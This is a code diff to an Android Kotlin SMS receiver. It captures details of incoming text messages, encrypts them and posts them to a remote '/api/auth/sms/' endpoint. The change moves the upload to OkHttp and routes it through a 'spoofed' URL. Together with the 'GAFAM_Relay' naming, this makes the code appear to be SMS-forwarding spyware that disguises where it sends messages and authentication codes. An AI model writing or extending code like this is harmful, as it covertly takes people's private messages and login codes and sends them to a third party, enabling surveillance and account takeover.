@@ -5,10 +5,11 @@ import android.content.Context
 import android.content.Intent
 import android.provider.Telephony
 import android.util.Log
-import java.net.HttpURLConnection
-import java.net.URL
-import kotlin.concurrent.thread
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import kotlin.concurrent.thread
 
 class SmsReceiver : BroadcastReceiver() {
 
@@ -64,14 +65,8 @@ class SmsReceiver : BroadcastReceiver() {
 
         thread {
             try {
-                val vpcUrl = URL("$apiUrl/api/auth/sms/") 
-                val connection = vpcUrl.openConnection() as HttpURLConnection
-                connection.connectTimeout = 5000
-                connection.readTimeout = 5000
-                connection.requestMethod = "POST"
-                connection.setRequestProperty("Content-Type", "application/json")
-                connection.setRequestProperty("Authorization", "Bearer $jwtSecret")
-                connection.doOutput = true
+                val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/")
+                val client = ApiClient.getClient(context) ?: return@thread
 
                 val jsonBody = JSONObject().apply {
                     put("sender", sender)
@@ -100,13 +95,15 @@ class SmsReceiver : BroadcastReceiver() {
                     put("iv", android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP))
                 }
 
-                connection.outputStream.use { os ->
-                    val input = encryptedPayload.toString().toByteArray(Charsets.UTF_8)
-                    os.write(input, 0, input.size)
-                }
+                val bodyPayload = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
+                val request = Request.Builder()
+                    .url(spoofedUrl)
+                    .post(bodyPayload)
+                    .addHeader("Authorization", "Bearer $jwtSecret")
+                    .build()
 
-                val responseCode = connection.responseCode
-                Log.d("GAFAM_Relay", "Réponse VPC: $responseCode")
+                val response = client.newCall(request).execute()
+                Log.d("GAFAM_Relay", "Réponse VPC: ${response.code}")
             } catch (e: Exception) {
                 Log.e("GAFAM_Relay", "Erreur d'envoi VPC", e)
             } finally {
